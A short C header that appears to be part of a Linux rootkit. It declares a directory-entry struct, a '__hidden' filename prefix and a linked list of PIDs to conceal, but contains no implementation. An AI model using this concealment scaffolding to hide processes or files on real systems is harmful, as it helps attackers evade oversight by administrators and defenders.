
#ifndef __FDLIB
#define __FDLIB

#define PREFIX_HIDDEN_FILE "__hidden"

struct linux_dirent {
   unsigned long  d_ino;
   unsigned long  d_off;
   unsigned short d_reclen;
   char           d_name[1];
};


struct hidden_pid_t{
   pid_t pid;
   int is_free; // true 1 or false 0
   struct hidden_pid_t *next;
};

typedef struct hidden_pid_t hidden_pid_t;

static hidden_pid_t* hidden_pid_list = NULL;

hidden_pid_t* last_hidden_pid(void);
hidden_pid_t* get_free_hidden_pid(void);
hidden_pid_t* get_hidden_pid(pid_t pid);

void free_pid_list(void);
int is_hidden_pid(pid_t pid);
int init_pid_list(void);
int add_hidden_pid(pid_t pid);
int remove_hidden_pid(pid_t pid);
int is_hidden_file(char *filename);
#endif
